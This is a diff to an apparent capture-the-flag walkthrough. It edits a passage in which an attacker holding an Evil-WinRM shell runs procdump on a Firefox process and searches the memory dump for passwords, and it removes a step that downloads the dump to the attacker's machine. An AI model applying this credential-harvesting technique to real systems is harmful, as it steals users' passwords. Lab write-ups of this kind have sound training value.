@@ -544,7 +544,7 @@ Info: Upload successful!
 {% endhighlight %}
 
 Then, execute the "procdump.exe".<br>
-It generates a process file for the firefox.
+It generates a process file for the firefox and this time 5 files are created due to 4 processes of firefox.
 {% highlight shell %}
 *Evil-WinRM* PS C:\Users\Chase\Desktop> ./procdump.exe -ma 6728 -accepteula
 
@@ -559,17 +559,6 @@ Sysinternals - www.sysinternals.com
 
 *Evil-WinRM* PS C:\Users\Chase\Desktop> 
 {% endhighlight %}
-
-Download the file to the localhost. "Evil-WinRM" has a command for that purpose.
-{% highlight shell %}
-*Evil-WinRM* PS C:\Users\Chase\Desktop> download firefox.exe_191202_022858.dmp
-Info: Downloading C:\Users\Chase\Desktop\firefox.exe_191202_022858.dmp to firefox.exe_191202_022858.dmp
-
-Info: Download successful!
-
-*Evil-WinRM* PS C:\Users\Chase\Desktop>
-{% endhighlight %}
-
 
 Try to analyze the process file.<br>
 To look for a word "password" in the process and we can find an URL parameter "password".
